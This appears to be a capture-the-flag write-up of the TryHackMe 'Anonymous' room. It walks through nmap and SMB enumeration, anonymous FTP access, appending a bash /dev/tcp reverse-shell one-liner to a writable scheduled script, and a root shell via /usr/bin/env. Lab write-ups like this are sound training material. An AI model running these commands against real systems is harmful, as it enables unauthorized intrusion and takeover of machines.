---
title: THM - Anonymous
author: guialvesf
date: 2022-03-24 01:00:00 -0300
categories: [tryhackme, writeup]
tags: [tryhackme, writeup]
image: "/img/thm/anonymous/anonymous.png"
alt: "tryhackme"
---

<p align="center" width="100%">
    <img src="/img/thm/anonymous/anonymous.png"> 
</p>
<hr>

# Questions
* Enumerate the machine.  How many ports are open?
* What service is running on port 21?
* What service is running on ports 139 and 445?
* There's a share on the user's computer.  What's it called?
<br>

Ok, we have four questions before User and Root flags, let's start enumerating the machine to answer the first one.

[Anonymous room](https://tryhackme.com/room/anonymous)

# Enumeration
![nmap](/img/thm/anonymous/nmap.png)

Let's start with standard nmap scan `nmap -sC -sV -oA nmap -v $IP`.
* sC - Default nmap scripts
* sV - Open ports services/version
* oA - Save output to 'nmap' file
* v  - Verbose mode

This is enough to answer the first tree questions. There's four open ports: 21 FTP, 22 SSH, 139 and 445 Samba.

To fourth question we'll need to run an another nmap script. As we can see, there are a Samba service running on machine, so we'll use a nse script to enumerate it. `nmap --script smb-enum-shares.nse -p 445,139 -v -oA smb $IP`

![smb](/img/thm/anonymous/smbNmap.png)

Nice, question answered, but why not access it? Using smbclient we can access this share and check it out. `smbclient \\\\$IP\\pics`

![smbclient](/img/thm/anonymous/smbclient.png)

Ok, nothing interesting here, so let's take a look at FTP server. It's allowing anonymous login.

![ftp](/img/thm/anonymous/ftpFiles.png)

Here I found 3 files:
* clean.sh
* removed_files.log
* to_do.txt

With basics FTP commands can we download these files to check it out. Taking a look at log file can I presume that `clean.sh` files are constantly being executed. So let's read it.

![cleansh](/img/thm/anonymous/cleanSh.png)

We have permissions to write inside this file, so let's do it with `append` command. First of all create a local file and put `bash -c 'exec bash -i &>/dev/tcp/$IP/$PORT <&1'` inside it.

![shell](/img/thm/anonymous/shell.png)

Then we'll append it to remote file, it will execute this command and give us a reverse shell.

![append](/img/thm/anonymous/append.png)

Don't forget to run Netcat to wait connection.

![user](/img/thm/anonymous/user.png)

Ok, it's PRIVESC TIME! To do it I used LinPEAS and reading the output I found something strange. Running a basic command can we get a root shell. So just typing `/usr/bin/env /bin/sh -p` we scalate our privileges.

![root](/img/thm/anonymous/root.png)
